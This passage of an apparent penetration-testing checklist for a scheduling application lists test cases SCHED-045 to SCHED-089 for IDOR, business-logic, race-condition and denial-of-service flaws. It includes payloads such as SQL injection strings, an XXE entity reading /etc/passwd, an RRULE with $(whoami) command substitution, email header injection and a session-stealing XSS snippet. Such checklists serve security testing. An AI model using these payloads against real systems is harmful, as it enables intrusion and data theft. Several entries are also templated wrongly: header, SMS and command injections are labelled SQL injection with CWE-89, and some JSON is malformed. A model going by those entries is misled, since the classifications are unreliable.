{"organizer":"ceo@company.com"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-045 — Availability IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. View own availability 2. Modify user_id parameter 3. View another user's availability 4. Privacy violation

**Expected Result:** Availability should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/availability
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-046 — Availability IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Update own availability 2. Modify user_id 3. Modify another user's availability 4. Schedule manipulation

**Expected Result:** Updates should verify ownership

**Payload Example:**

```
PUT /api/users/victim_id/availability {"available":false}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-047 — Availability Time Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Set availability window 2. Modify times to invalid range 3. Create impossible availability 4. System error

**Expected Result:** Time ranges should be validated

**Payload Example:**

```
{"start":"23:00",end:"01:00"} or {"start":"25:00"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-048 — Availability Blocking Attack
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Block all time slots 2. Make user appear unavailable 3. No bookings possible 4. Business disruption

**Expected Result:** Blocking should have limits or approval

**Payload Example:**

```
Block 100% of working hours via API
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-049 — Availability Exception Injection
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Create availability exception 2. Inject overlapping exceptions 3. Create conflicting rules 4. Unpredictable availability

**Expected Result:** Exceptions should be validated

**Payload Example:**

```
Overlapping available/unavailable exceptions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-050 — Availability Pattern SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Query availability patterns 2. Inject SQL in filter 3. Extract all availability data 4. Data breach

**Expected Result:** Queries should be parameterized

**Payload Example:**

```
pattern_filter='; SELECT * FROM availability--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-051 — Availability Template IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Use own availability template 2. Modify template_id 3. Apply another's template 4. Copy their schedule

**Expected Result:** Templates should verify ownership

**Payload Example:**

```
POST /api/availability/apply-template {"template_id":"victim_template"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-052 — Availability Override Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Regular user sets availability 2. Try admin override 3. Override other users 4. Unauthorized control

**Expected Result:** Override should require admin role

**Payload Example:**

```
POST /api/admin/availability/override as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-053 — Availability Timezone Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Set availability with timezone 2. Modify timezone 3. Create time discrepancy 4. Booking confusion

**Expected Result:** Timezone should be validated

**Payload Example:**

```
{"timezone":"Invalid/Timezone"} or extreme offset
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-054 — Availability Import XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Import availability from file 2. Include XXE payload 3. File parsed 4. Server file disclosure

**Expected Result:** XML import should disable entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## SCHED-055 — Availability Export IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Export own availability 2. Modify user_id 3. Export others' availability 4. Information disclosure

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/users/victim_id/availability/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-056 — Availability Bulk Update IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Availability Management

**Test Steps:** 1. Bulk update own availability 2. Include others' user IDs 3. Modify multiple users 4. Mass disruption

**Expected Result:** Bulk updates should verify ownership

**Payload Example:**

```
POST /api/availability/bulk {"user_ids":["own",victim1,victim2]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-057 — Time Slot Race Condition
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. View available slot 2. Submit concurrent bookings 3. Both succeed 4. Double booking

**Expected Result:** Slot selection should be atomic

**Payload Example:**

```
Parallel POST requests for same slot
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SCHED-058 — Time Slot Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Enumerate slot IDs 2. Find booked slots 3. Identify booking patterns 4. Privacy violation

**Expected Result:** Slot information should be limited

**Payload Example:**

```
Different responses for booked vs available slots
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SCHED-059 — Past Slot Selection Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. View current slots 2. Modify to past time 3. Book past slot 4. Data manipulation

**Expected Result:** Past slots should be rejected

**Payload Example:**

```
{"slot_id":"past_slot_123"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-060 — Slot Price Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Select time slot 2. Modify slot price 3. Book at wrong price 4. Financial loss

**Expected Result:** Price should be server-calculated

**Payload Example:**

```
{"slot_id":"premium_slot",price:0.01}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-061 — Hidden Slot Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. View public slots 2. Enumerate hidden slot IDs 3. Access VIP-only slots 4. Unauthorized booking

**Expected Result:** Hidden slots should verify access

**Payload Example:**

```
Book slot not shown in public availability
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-062 — Slot Duration Extension
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Select standard slot 2. Modify duration 3. Get extended time 4. Resource theft

**Expected Result:** Duration should be fixed per slot type

**Payload Example:**

```
{"slot_id":"30min",duration:120}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-063 — Slot Provider Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Select slot 2. Change provider_id 3. Book with different provider 4. Unauthorized assignment

**Expected Result:** Provider should match slot

**Payload Example:**

```
{"slot_id":"provider_a_slot",provider_id:"provider_b"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-064 — Slot Buffer Time Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Slots have buffer time 2. Book adjacent slots 3. Bypass buffer requirement 4. Overlapping appointments

**Expected Result:** Buffer time should be enforced

**Payload Example:**

```
Book slot that overlaps buffer period
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-065 — Slot Capacity Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Slot has capacity limit 2. Modify capacity parameter 3. Add more participants 4. Overbooking

**Expected Result:** Capacity should be server-enforced

**Payload Example:**

```
{"slot_id":"123",participants:100} when max is 10
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-066 — Slot Selection CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Create malicious page 2. Auto-select slot 3. User visits 4. Slot reserved without consent

**Expected Result:** Selection should require CSRF token

**Payload Example:**

```
<img src="/slots/123/select">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SCHED-067 — Slot Lock Bypass
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. User A locks slot 2. User B rapidly books 3. Both get slot 4. Conflict

**Expected Result:** Locking should be atomic

**Payload Example:**

```
Book during lock window
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SCHED-068 — Slot Timezone Confusion
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Select slot in one timezone 2. Modify timezone 3. Book in different actual time 4. Scheduling error

**Expected Result:** Timezone should be consistent

**Payload Example:**

```
Change timezone between view and book
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-069 — Slot SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Time Slot Selection

**Test Steps:** 1. Query available slots 2. Inject SQL in date/time filter 3. Extract all slot data 4. Data breach

**Expected Result:** Queries should be parameterized

**Payload Example:**

```
date=2024-01-01'; SELECT * FROM slots--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-070 — Recurring Event Infinite Loop
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create recurring event 2. Set no end date with high frequency 3. Generate infinite events 4. DoS

**Expected Result:** Recurrence should have limits

**Payload Example:**

```
RRULE:FREQ=SECONDLY;INTERVAL=1 without end
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-071 — Recurring Event Count Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create recurring event 2. Modify occurrence count 3. Create excessive events 4. Resource exhaustion

**Expected Result:** Count should have maximum limit

**Payload Example:**

```
{"count":999999999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-072 — Recurring Event IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Edit own recurring series 2. Modify series_id 3. Edit another's series 4. Mass calendar manipulation

**Expected Result:** Series editing should verify ownership

**Payload Example:**

```
PUT /api/events/series/victim_series_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-073 — Recurring Event Exception IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create exception to own event 2. Modify event_id 3. Create exception for others' event 4. Disrupt their schedule

**Expected Result:** Exception should verify event ownership

**Payload Example:**

```
POST /api/events/victim_event/exceptions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-074 — Recurring Event Delete All IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Delete all instances of own series 2. Modify series_id 3. Delete another's series 4. Data destruction

**Expected Result:** Mass deletion should verify ownership

**Payload Example:**

```
DELETE /api/events/series/victim_series_id/all
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-075 — Recurrence Rule Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Event

**Test Steps:** 1. Create custom recurrence rule 2. Inject malicious RRULE 3. Rule processed 4. System error or bypass

**Expected Result:** RRULE should be strictly validated

**Payload Example:**

```
RRULE:FREQ=DAILY;BYDAY=$(whoami)
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-076 — Recurring Event Past Start Date
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create recurring event 2. Set start date in past 3. Generate historical events 4. Data manipulation

**Expected Result:** Past start dates should be restricted

**Payload Example:**

```
{"start":"2020-01-01",rrule:"FREQ=DAILY"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-077 — Recurring Event Instance Override Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Override single instance 2. Bypass series permissions 3. Modify protected instance 4. Unauthorized change

**Expected Result:** Instance override should check series permissions

**Payload Example:**

```
Override instance of locked recurring event
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-078 — Recurring Event XSS Propagation
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create recurring event with XSS 2. XSS in all instances 3. Multiple victims affected 4. Mass XSS

**Expected Result:** All instances should sanitize content

**Payload Example:**

```
XSS in recurring event title affecting all occurrences
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-079 — Recurring Event Until Date Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Set recurring event with until date 2. Modify until to far future 3. Create excessive events 4. Resource abuse

**Expected Result:** Until dates should be reasonable

**Payload Example:**

```
{"until":"2099-12-31"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-080 — Recurring Event Frequency Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create daily recurring event 2. Change to secondly frequency 3. Generate massive events 4. DoS

**Expected Result:** Frequency should be restricted

**Payload Example:**

```
Change FREQ=DAILY to FREQ=SECONDLY
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-081 — Recurring Event Cross-Calendar
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Recurring Events

**Test Steps:** 1. Create recurring event 2. Modify calendar_id mid-series 3. Events span multiple calendars 4. Unauthorized access

**Expected Result:** Calendar should be consistent for series

**Payload Example:**

```
Split series across unauthorized calendars
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-082 — Reminder IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. View own reminders 2. Modify reminder_id 3. View another user's reminders 4. Privacy violation

**Expected Result:** Reminder access should verify ownership

**Payload Example:**

```
GET /api/reminders/victim_reminder_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-083 — Reminder IDOR Modification
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Modify own reminder 2. Change reminder_id 3. Modify another's reminder 4. Disrupt their alerts

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/reminders/victim_id {"enabled":false}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-084 — Reminder IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Delete own reminder 2. Modify reminder_id 3. Delete others' reminders 4. Miss important events

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/reminders/victim_reminder_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-085 — Reminder Email Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set reminder recipient 2. Inject email headers 3. Send spam 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
email=victim@test.com%0ABcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-086 — Reminder SMS Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set SMS reminder 2. Inject SMS content 3. Send malicious SMS 4. Phishing

**Expected Result:** SMS content should be sanitized

**Payload Example:**

```
Inject premium rate numbers or phishing links
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-087 — Reminder XSS in Message
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set custom reminder message 2. Include XSS 3. Reminder displayed 4. XSS executes

**Expected Result:** Messages should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in reminder message
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-088 — Reminder Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Create many reminders 2. Set same trigger time 3. Flood notification system 4. DoS

**Expected Result:** Reminder count should be limited

**Payload Example:**

```
Create 10000 reminders for same minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SCHED-089 — Reminder Time Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set reminder time 2. Modify to immediate 3. Trigger instant notification 4. Spam

**Expected Result:** Reminder times should be validated

**Payload Example:**

```
{"remind_at":"1970-01-01T00:00:00Z"} for immediate
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-090 — Reminder Webhook SSRF
